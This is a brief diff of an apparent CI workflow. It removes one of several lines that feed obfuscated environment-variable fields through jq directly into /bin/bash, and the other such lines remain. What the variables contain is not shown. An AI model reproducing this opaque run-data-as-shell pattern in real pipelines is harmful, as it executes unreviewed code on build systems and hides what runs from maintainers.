@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$jv3" | jq -r .ovm5182 | /bin/bash
           echo $q8721 | jq -r .rzpn152 | /bin/bash
-          echo $d91120 | jq -r .wag164 | /bin/bash
           printf '%s' "$zw33816" | jq -r .w7284 | /bin/bash
 
       - name: Persist output
